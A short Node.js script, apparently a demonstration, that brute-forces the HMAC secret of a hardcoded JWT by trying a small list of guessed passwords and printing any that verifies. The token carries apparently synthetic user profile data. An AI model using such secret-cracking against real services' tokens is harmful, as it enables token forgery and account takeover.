
const jwt = require('jsonwebtoken')

let token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDI3ZWQxNzhmYzI2MTYyZDY2ZmQ5NTUiLCJuYW1lIjoiRG9ubmllIE5pZW5vdyIsImVtYWlsIjoiRG9ubmllTmllbm93X0xhcnNvbjI1QGdtYWlsLmNvbSIsImltYWdlIjoiaHR0cHM6Ly9jbG91ZGZsYXJlLWlwZnMuY29tL2lwZnMvUW1kM1c1RHVoZ0hpckxIR1ZpeGk2Vjc2TGhDa1pVejZwbkZ0NUFKQml5dkh5ZS9hdmF0YXIvMzIuanBnIiwiZ2VuZGVyIjoibWFsZSIsImRhdGVPZkJpcnRoIjoiMTk1MC0wOS0wMVQwNToxMTozNC4xNzVaIiwiY3JlYXRlZEF0IjoiMjAyMy0wNC0wMVQwODozNjozOS4yMjdaIiwidXBkYXRlZEF0IjoiMjAyMy0wNC0wMVQwODozNjozOS4yMjdaIiwiaWF0IjoxNjgwNjIyMDk3fQ.IjwBMnnXl6IKaq9nP75KsGxiD3MGcRblknMEcw12yc4"

let passwords = [
    'password',
    '123456789',
    'winter_is_coming',
]

for (const secret of passwords) {
    try {
        jwt.verify(token, secret)
        console.log('Secret identified', secret)
    }
    catch(err) {

    }
}